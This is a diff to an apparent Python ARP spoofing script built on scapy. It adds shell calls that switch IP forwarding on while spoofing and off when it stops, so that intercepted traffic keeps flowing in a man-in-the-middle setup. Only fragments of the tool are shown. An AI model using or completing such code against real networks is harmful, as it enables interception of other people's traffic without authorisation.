@@ -4,6 +4,7 @@ import scapy.all as scapy
 import optparse
 import time
 import logging
+import subprocess
 
 def get_argument():
     parser=optparse.OptionParser()
@@ -35,6 +36,7 @@ def recover(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 options = get_argument()
+subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
 sent_packet_count = 0
 try:
     while True:
@@ -46,4 +48,5 @@ try:
 except KeyboardInterrupt:
     recover(options.ip_tar,options.ip_gat)
     recover(options.ip_gat,options.ip_tar)
+    subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
     print("\n[+] Stopped spoofing and reverting the changes.... Please wait")
